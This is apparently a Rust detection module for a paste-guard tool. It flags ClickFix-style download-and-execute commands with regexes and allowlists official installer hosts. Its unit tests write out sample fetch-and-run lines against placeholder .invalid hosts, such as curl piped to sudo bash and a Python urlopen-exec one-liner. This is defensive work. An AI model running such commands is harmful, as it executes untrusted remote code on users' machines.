//! Download-and-execute (legacy `DownloadExecution`, docs/spec/detection-rules.md
//! §3.1–3.2, #20): fetch content from the network and hand it to iex, PowerShell,
//! cmd or a shell, or save it to a file and start that file. This is the core
//! ClickFix move and is enough to block on its own, unless every source is an
//! official installer host or URL prefix (F17), in which case it only warns.
//!
//! 1b adds the macOS / Linux and Windows forms of §3.1 (`bash -c "$(curl …)"`,
//! `| sudo bash`, interpreter one-liners, saving then running the same file,
//! `.Invoke(…)`, rundll32 on a downloaded DLL) and the URL path allowlist.
//!
//! Only matches normalized text ([`super::normalize`]).

use paste_warden_rules::command::CommandRules;

use super::markdown;
use super::re::{alternation, lazy_re};

const FETCH: &str = r"\b(?:iwr|irm|invoke-webrequest|invoke-restmethod|curl|wget)(?:\.exe)?\b";
/// What a download may be piped into. 1b: `sudo` (with flags), `/bin/`-style paths,
/// `env`, ksh / dash, `osascript`, and script interpreters that read the script from
/// standard input (`| python3`, `| perl -`; not `| python -m json.tool`).
const INTERPRETER: &str = r"(?:sudo\s+(?:-\S+\s+)*)?(?:/(?:usr/)?(?:local/)?bin/)?(?:env\s+)?(?:(?:iex|invoke-expression|powershell|pwsh|cmd|(?:ba|z|k|da)?sh|osascript)(?:\.exe)?\b|(?:python[23]?|perl|ruby|node)(?:\.exe)?(?:\s*$|\s+-(?:\s|$)|\s*[;&|)]))";
const WEB_CLIENT: &str = r"\(?\s*new-object\s+(?:system\.)?net\.webclient\b";
/// Shells and interpreters that run a script given as an argument or a file.
const SHELL: &str = r"(?:(?:ba|z|k|da)?sh|python[23]?|perl|ruby|node)";

lazy_re! {
    /// Any kind of download (combined with other conditions).
    pub(crate) fn any_fetch = format!(
        r"(?i){FETCH}|download(?:string|data|file)\b|\bnet\.webclient\b|\bstart-bitstransfer\b|\bcertutil\b.*-urlcache|\bbitsadmin\b.*/transfer"
    );
}
lazy_re! {
    /// A: download piped to iex or an interpreter. The download needs at least one
    /// argument so a table row `| curl | cmd |` does not count.
    fn pipe_to_interpreter = format!(
        r"(?im)(?:{FETCH}\s+[^\s|]|download(?:string|data)\s*\()[^\r\n]*\|\s*{INTERPRETER}"
    );
}
lazy_re! {
    /// A' (1b): download run through command or process substitution:
    /// `bash -c "$(curl …)"`, `eval "$(wget -qO- …)"`, `source <(curl …)`,
    /// `bash <(curl …)`, `. <(curl …)`, `` sh -c "`curl …`" ``.
    fn substitution = format!(
        r#"(?im)(?:(?-u:\b){SHELL}(?:\s+-[a-z]+)*\s+|(?-u:\b)eval\s+|(?-u:\b)source\s+|(?:^|[\s;&|])\.\s+)["']?(?:\$\(|<\(|`)\s*(?:sudo\s+)?(?:curl|wget)(?-u:\b)"#
    );
}
lazy_re! {
    /// B: iex wrapping a download.
    fn invoke_fetch = format!(
        r#"(?i)\b(?:iex|invoke-expression)\b[\s("'&{{$]*(?:{FETCH}|{WEB_CLIENT}|\[(?:system\.)?net\.webclient\])"#
    );
}
lazy_re! {
    /// B' (1b): `.Invoke(…)` / `.InvokeScript(…)` wrapping a download.
    fn invoke_method_fetch = format!(
        r#"(?i)\.invoke(?:script)?\s*\(\s*[\s("'&{{$]*(?:{FETCH}|{WEB_CLIENT}|\[(?:system\.)?net\.webclient\])"#
    );
}
lazy_re! {
    /// C (1/2): download stored in a variable.
    fn assign_fetch = format!(
        r#"(?i)\$[\w:]+\s*=\s*[\s("'$]*(?:{FETCH}|{WEB_CLIENT})|\$[\w:]+\s*=\s*[^\r\n;]*download(?:string|data)\s*\("#
    );
}
lazy_re! {
    /// C (2/2): iex of a variable.
    fn invoke_variable =
        r#"(?i)\b(?:iex|invoke-expression)\b[\s("'&{]*\$|\$[\w:]+[^\r\n|]*\|\s*(?:iex|invoke-expression)\b"#;
}
lazy_re! {
    /// D: `[ScriptBlock]::Create`, and (1b) `$ExecutionContext.InvokeCommand.
    /// NewScriptBlock` / `.InvokeScript` (with any download).
    fn script_block_create =
        r"(?i)scriptblock\]\s*::\s*create\b|invokecommand\s*\.\s*(?:newscriptblock|invokescript)\b";
}
lazy_re! {
    /// E (1/2): download saved to a file.
    fn save_to_file = r"(?im)-outfile\b|\bdownloadfile\b|-urlcache\b|/transfer\b|\bstart-bitstransfer\b|(?:^|\s)(?:-o|--output|--output-document)(?:\s|=)";
}
lazy_re! {
    /// E (2/2): a file being started. 1b: rundll32 / regsvr32 loading a file, and
    /// `Invoke-Command -FilePath`.
    fn run_file = format!(
        r#"(?im)\b(?:start-process|saps|invoke-item)\b|(?:^|[;&|(])\s*(?:start|call)\s+\S|(?:^|[;(]|&&|\|\|)\s*&\s*\S|(?:^|[;&|(])\s*["']?[^\s"'|&;<>()]*\.(?:{})\b|\b(?:rundll32|regsvr32)(?:\.exe)?\s+(?:[-/]\S+\s+)*["']?[^\s"',/-]|\b(?:invoke-command|icm)\b[^\r\n]*-filepath\b"#,
        alternation(&CommandRules::embedded().extensions.launch)
    );
}
lazy_re! {
    /// F (1b, 1/2): files saved by curl / wget on one line: `-o f`, `-O f`,
    /// `--output f`, `--output-document=f`, `> f`; curl `-O` and plain wget save
    /// under the URL's last path segment.
    fn saved_name = r#"(?i)(?:\s-[a-z]*o\s*|\s--output(?:-document)?[=\s]\s*|\s>\s*)["']?(?P<f>[^\s"'|;&<>()]+)"#;
}
lazy_re! {
    /// F: curl / wget (ASCII word boundaries keep this fast on non-ASCII text).
    fn curl_wget = r"(?i)(?-u:\b)(?:curl|wget)(?:\.exe)?(?-u:\b)";
}
lazy_re! {
    /// F (1b, 2/2): a file run in command position, directly (`./x`, `/tmp/x`), by
    /// a shell or interpreter (`sh x.sh`, `python3 x.py`), sourced or `open`ed.
    fn run_target = format!(
        r#"(?im)(?:^|[;&|(])\s*(?:sudo\s+(?:-\S+\s+)*)?(?:nohup\s+)?(?:(?:/(?:usr/)?bin/)?{SHELL}\s+(?:-\S+\s+)*|source\s+|\.\s+|open\s+(?:-a\s+\S+\s+)?)?["']?(?P<t>[^\s"';&|<>()]+)"#
    );
}
lazy_re! {
    /// G (1b, 1/3): a script interpreter one-liner (`python3 -c`, `perl -e`,
    /// `ruby -e`, `node -e`, `php -r`).
    fn one_liner = r"(?i)(?-u:\b)(?:python[23w]?(?:\.\d+)?|py|perl|ruby|node|php)(?:\.exe)?\s+(?:-\S+\s+)*-[ecr]\s";
}
lazy_re! {
    /// G (2/3): …that fetches from the network…
    fn one_liner_fetch = r#"(?i)urlopen|urllib|requests\.get|http\.client|httpx|lwp::|http::tiny|getstore|(?-u:\b)get\s*\(\s*["']https?:|net::http|open-uri|uri\.open|https?\.get\s*\(|(?-u:\b)fetch\s*\(|file_get_contents\s*\(\s*["']https?:|(?-u:\b)curl(?-u:\b)|(?-u:\b)wget(?-u:\b)"#;
}
lazy_re! {
    /// G (3/3): …and runs what it fetched.
    fn one_liner_exec = r"(?i)(?-u:\b)exec\s*\(|(?-u:\b)eval(?-u:\b)|os\.system|subprocess|os\.popen|(?-u:\b)system\s*\(|(?-u:\b)popen(?-u:\b)|execsync|child_process|\|\s*(?:ba|z)?sh(?-u:\b)";
}
lazy_re! {
    /// URL parts: scheme, host (up to the next separator; [`clean_host`] removes
    /// `user@` and the port; backslash ends the host too, `https://evil\.astral.sh`
    /// → `evil`) and path (up to whitespace, quotes, `?`, `#`…).
    fn url_parts = r#"(?i)\b(?P<scheme>https?|ftp)://(?P<host>[^/\s"'`)\]|;?#\\]*)(?P<path>/[^\s"'`)\]|;?#\\]*)?"#;
}
lazy_re! {
    /// Download target without a scheme (`irm get.scoop.sh`, `iwr -useb get.scoop.sh`).
    /// The host must be followed by a separator, so `irm astral.sh@x` yields no host.
    fn bare_host = format!(
        r#"(?im){FETCH}(?:\s+-(?:usebasicparsing|useb|uri|[fsl]{{1,4}}))*\s+["']?(?P<host>[a-z0-9-]+(?:\.[a-z0-9-]+)+)(?:$|[\s/"'|;)])"#
    );
}
lazy_re! {
    /// URLs built from pieces cannot be trusted (`'https://astral.sh'+'.example.invalid'`).
    /// Backticks are checked separately ([`markdown::has_code_backtick`]) so
    /// markdown fences and inline code do not count. 1b adds `[char[]]`,
    /// `[string]::…`, `.Insert()` and other string methods, cmd substrings,
    /// `\x` escapes, URL escapes and shell / Python Base64 decoding.
    fn built_string = r#"(?i)["']\s*\+|\+\s*["']|-join\b|\[char\]|\[char\[\]\]|["']\s*-f\b|-c?replace\b|frombase64string|\[string\]\s*::|\.(?:insert|substring|remove|reverse|replace)\s*\(|[%!][\w.#$@-]+:~|\\x[0-9a-f]{2}|(?:%[0-9a-f]{2}){3}|\bbase64\s+(?:-\w+\s+)*(?:-d|--decode)\b|\bxxd\s+-r|b64decode"#;
}
lazy_re! {
    /// Lines that may carry the source host: execution and variable assignments.
    fn relevant_line = r#"(?i)\b(?:iex|invoke-expression)\b|scriptblock\]|\$[\w:]+\s*=|\bset\s+"?[a-z_][\w.-]*="#;
}

/// Does normalized `text` contain a download-and-execute construct?
pub(crate) fn is_match(text: &str) -> bool {
    if pipe_to_interpreter().is_match(text)
        || invoke_fetch().is_match(text)
        || invoke_method_fetch().is_match(text)
        || substitution().is_match(text)
    {
        return true;
    }
    if assign_fetch().is_match(text) && invoke_variable().is_match(text) {
        return true;
    }
    if script_block_create().is_match(text) && any_fetch().is_match(text) {
        return true;
    }
    if save_to_file().is_match(text) && run_file().is_match(text) && any_fetch().is_match(text) {
        return true;
    }
    interpreter_one_liner(text) || saved_then_run(text)
}

/// G: one line with an interpreter one-liner that both fetches and executes.
fn interpreter_one_liner(text: &str) -> bool {
    let Some(re) = one_liner().get() else {
        return false;
    };
    re.find_iter(text).any(|m| {
        let start = text[..m.start()].rfind('\n').map_or(0, |i| i + 1);
        let end = text[m.end()..]
            .find('\n')
            .map_or(text.len(), |i| m.end() + i);
        let line = &text[start..end];
        one_liner_fetch().is_match(line) && one_liner_exec().is_match(line)
    })
}

/// At most this many saved file names are compared with run targets.
const MAX_SAVED_NAMES: usize = 32;

/// F: a file saved by curl / wget is then run in command position (compared by
/// file name: `curl -o /tmp/x …; chmod +x /tmp/x; /tmp/x`, `sh get-docker.sh`).
fn saved_then_run(text: &str) -> bool {
    let (Some(saved_re), Some(run_re), Some(fetch_re)) =
        (saved_name().get(), run_target().get(), curl_wget().get())
    else {
        return false;
    };
    if !fetch_re.is_match(text) {
        return false;
    }
    let mut saved: Vec<&str> = Vec::new();
    for line in text.split('\n') {
        let Some(fetch) = fetch_re.find(line) else {
            continue;
        };
        let is_wget = fetch.as_str().to_ascii_lowercase().starts_with("wget");
        for c in saved_re.captures_iter(line) {
            if let Some(f) = c.name("f") {
                saved.push(base_name(f.as_str()));
            }
        }
        // curl -O / plain wget save under the URL's last path segment.
        let remote_name = is_wget
            || line
                .split_whitespace()
                .any(|w| w.starts_with('-') && !w.starts_with("--") && w[1..].contains('O'))
            || line.contains("--remote-name");
        if remote_name {
            for c in url_parts()
                .get()
                .into_iter()
                .flat_map(|r| r.captures_iter(line))
            {
                if let Some(p) = c.name("path") {
                    saved.push(base_name(p.as_str()));
                }
            }
        }
        if saved.len() >= MAX_SAVED_NAMES {
            break;
        }
    }
    saved.retain(|n| !n.is_empty() && *n != "." && *n != ".." && !n.starts_with('-'));
    if saved.is_empty() {
        return false;
    }
    run_re.captures_iter(text).any(|c| {
        c.name("t").is_some_and(|t| {
            let t = base_name(t.as_str());
            saved.iter().any(|s| s.eq_ignore_ascii_case(t))
        })
    })
}

/// Last path segment (`/tmp/x.sh` → `x.sh`, `./x` → `x`).
fn base_name(path: &str) -> &str {
    let path = path.trim_end_matches(['/', '\\']);
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

/// Is any URL in normalized `text` built from pieces (string operators, escapes,
/// encodings)? Such text never qualifies for the official installer lists.
pub(crate) fn has_built_string(text: &str) -> bool {
    built_string().is_match(text) || markdown::has_code_backtick(text)
}

/// Every source on the download / execute / assignment lines is an official
/// installer host or URL prefix, at least one source was found, and no URL is
/// built from pieces. Other lines (a README link copied along with the command)
/// are ignored.
pub(crate) fn is_from_official_source(text: &str) -> bool {
    if has_built_string(text) {
        return false;
    }
    // Hosts are read with and without markdown code markers: `` `https://astral.sh`.x ``
    // reads `astral.sh` with them but `astral.sh.x` without (and PowerShell agrees
    // with the latter). Both readings must be official.
    let stripped = markdown::strip_code_markers(text);
    official_sources(text) && (stripped == text || official_sources(&stripped))
}

fn official_sources(text: &str) -> bool {
    let relevant = text
        .split('\n')
        .filter(|line| any_fetch().is_match(line) || relevant_line().is_match(line))
        .collect::<Vec<_>>()
        .join("\n");
    let sources = sources(&relevant);
    !sources.is_empty() && sources.iter().all(Source::is_official)
}

/// Is `host` an official installer host or a subdomain of one
/// (`rules/command/official-hosts.json`)? ASCII only, case-insensitive; substrings,
/// prefixes and extra characters never match.
pub fn is_official_host(host: &str) -> bool {
    is_ascii_host(host)
        && CommandRules::embedded().official_hosts.iter().any(|o| {
            let o = o.host.as_str();
            host.eq_ignore_ascii_case(o)
                || host.len() > o.len()
                    && host.get(host.len() - o.len() - 1..).is_some_and(|tail| {
                        tail.starts_with('.') && tail[1..].eq_ignore_ascii_case(o)
                    })
        })
}

/// Is `https://host/path` under an official URL prefix
/// (`rules/command/official-paths.json`)? The host must equal the prefix host (no
/// subdomains); every path segment must be plain (`[A-Za-z0-9._~-]`, not `.` or
/// `..`); the prefix segments match case-insensitively and at least one more
/// segment follows.
pub(crate) fn is_official_path(scheme: &str, host: &str, path: &str) -> bool {
    if !scheme.eq_ignore_ascii_case("https") || !is_ascii_host(host) {
        return false;
    }
    let Some(rest) = path.strip_prefix('/') else {
        return false;
    };
    let segments: Vec<&str> = rest.split('/').collect();
    let plain = |s: &&str| {
        !s.is_empty()
            && !s.chars().all(|c| c == '.')
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '~' | '-'))
    };
    if !segments.iter().all(plain) {
        return false;
    }
    CommandRules::embedded().official_paths.iter().any(|p| {
        let prefix: Vec<&str> = p.segments().collect();
        host.eq_ignore_ascii_case(p.host())
            && segments.len() > prefix.len()
            && prefix
                .iter()
                .zip(&segments)
                .all(|(a, b)| a.eq_ignore_ascii_case(b))
    })
}

/// `^[a-z0-9-]+(?:\.[a-z0-9-]+)+$`, ASCII only.
fn is_ascii_host(host: &str) -> bool {
    let mut labels = 0;
    for label in host.split('.') {
        if label.is_empty()
            || !label
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-')
        {
            return false;
        }
        labels += 1;
    }
    labels >= 2
}

/// A download source: a host, plus scheme and path when it came from a URL.
struct Source {
    host: String,
    url: Option<(String, String)>,
}

impl Source {
    fn is_official(&self) -> bool {
        is_official_host(&self.host)
            || self
                .url
                .as_ref()
                .is_some_and(|(scheme, path)| is_official_path(scheme, &self.host, path))
    }
}

/// Download sources in `text`: URLs first, then scheme-less targets.
fn sources(text: &str) -> Vec<Source> {
    let urls = url_parts()
        .get()
        .into_iter()
        .flat_map(|r| r.captures_iter(text))
        .filter_map(|c| {
            let host = clean_host(c.name("host")?.as_str());
            let scheme = c.name("scheme")?.as_str().to_owned();
            let path = c.name("path").map_or("", |m| m.as_str()).to_owned();
            Some(Source {
                host,
                url: Some((scheme, path)),
            })
        });
    let bare = bare_host()
        .get()
        .into_iter()
        .flat_map(|r| r.captures_iter(text))
        .filter_map(|c| {
            Some(Source {
                host: clean_host(c.name("host")?.as_str()),
                url: None,
            })
        });
    urls.chain(bare).filter(|s| !s.host.is_empty()).collect()
}

/// Download hosts in `text` (URLs first, then scheme-less targets), lowercase,
/// without duplicates, in order of appearance.
pub(crate) fn hosts(text: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for s in sources(text) {
        if !out.contains(&s.host) {
            out.push(s.host);
        }
    }
    out
}

/// Drops `user@`, a trailing `:port`, trailing dots; lowercases.
fn clean_host(raw: &str) -> String {
    let host = raw.rsplit_once('@').map_or(raw, |(_, h)| h);
    let host = match host.rsplit_once(':') {
        Some((h, port)) if port.chars().all(|c| c.is_ascii_digit()) => h,
        _ => host,
    };
    host.to_lowercase().trim_end_matches('.').to_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn all_patterns_compile() {
        for re in [
            any_fetch(),
            pipe_to_interpreter(),
            substitution(),
            invoke_fetch(),
            invoke_method_fetch(),
            assign_fetch(),
            invoke_variable(),
            script_block_create(),
            save_to_file(),
            run_file(),
            saved_name(),
            curl_wget(),
            run_target(),
            one_liner(),
            one_liner_fetch(),
            one_liner_exec(),
            url_parts(),
            bare_host(),
            built_string(),
            relevant_line(),
        ] {
            assert!(re.compiled());
        }
    }

    #[test]
    fn official_hosts() {
        assert!(is_official_host("astral.sh"));
        assert!(is_official_host("DOCS.Astral.sh"));
        assert!(!is_official_host("xastral.sh"));
        assert!(!is_official_host("astral.sh.example.invalid"));
        assert!(!is_official_host("a\u{212A}a.ms"));
        assert!(!is_official_host("sh"));
    }

    #[test]
    fn official_paths() {
        let h = "raw.githubusercontent.com";
        assert!(is_official_path(
            "https",
            h,
            "/Homebrew/install/HEAD/install.sh"
        ));
        assert!(is_official_path(
            "HTTPS",
            h,
            "/homebrew/INSTALL/HEAD/install.sh"
        ));
        assert!(is_official_path(
            "https",
            h,
            "/nvm-sh/nvm/v0.40.1/install.sh"
        ));
        assert!(!is_official_path(
            "http",
            h,
            "/Homebrew/install/HEAD/install.sh"
        ));
        assert!(!is_official_path("https", h, "/Homebrew/install/"));
        assert!(!is_official_path("https", h, "/Homebrew/install"));
        assert!(!is_official_path("https", h, "/Homebrew/installer/x.sh"));
        assert!(!is_official_path(
            "https",
            h,
            "/Homebrew/install/../../evil/x/a.sh"
        ));
        assert!(!is_official_path(
            "https",
            h,
            "/Homebrew/install/%2e%2e/a.sh"
        ));
        assert!(!is_official_path("https", h, "/Homebrew/install//a.sh"));
        assert!(!is_official_path(
            "https",
            "x.raw.githubusercontent.com",
            "/Homebrew/install/a"
        ));
        assert!(!is_official_path(
            "https",
            "example.invalid",
            "/Homebrew/install/a"
        ));
    }

    #[test]
    fn host_extraction() {
        assert_eq!(
            hosts("irm https://user@Astral.sh:443/x | iex; iwr -useb get.scoop.sh"),
            vec!["astral.sh", "get.scoop.sh"]
        );
        assert_eq!(hosts(r"iwr https://evil\.astral.sh"), vec!["evil"]);
        assert!(hosts("irm astral.sh@example.invalid").is_empty());
    }

    #[test]
    fn unix_forms() {
        for s in [
            "/bin/bash -c \"$(curl -fsSL https://x.invalid/a.sh)\"",
            "eval \"$(wget -qO- https://x.invalid/a)\"",
            "source <(curl -s https://x.invalid/a)",
            "curl -fsSL https://x.invalid/a | sudo -E bash -",
            "curl -s https://x.invalid/a | python3",
            "curl -o /tmp/u https://x.invalid/u && chmod +x /tmp/u && /tmp/u",
            "wget https://x.invalid/i.sh; sh i.sh",
            "curl -LO https://x.invalid/run.sh && bash ./run.sh",
            "python3 -c \"import urllib.request as u;exec(u.urlopen('https://x.invalid').read())\"",
        ] {
            assert!(is_match(s), "{s}");
        }
        for s in [
            "curl -s https://x.invalid/a | python3 -m json.tool",
            "curl -o a.tar.gz https://x.invalid/a.tar.gz && tar xzf a.tar.gz",
            "wget https://x.invalid/a.zip && unzip a.zip",
            "python3 -c 'print(1)'",
            "curl -fsSL https://x.invalid/key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg",
            "curl -s https://x.invalid/a | sha256sum",
        ] {
            assert!(!is_match(s), "{s}");
        }
    }
}
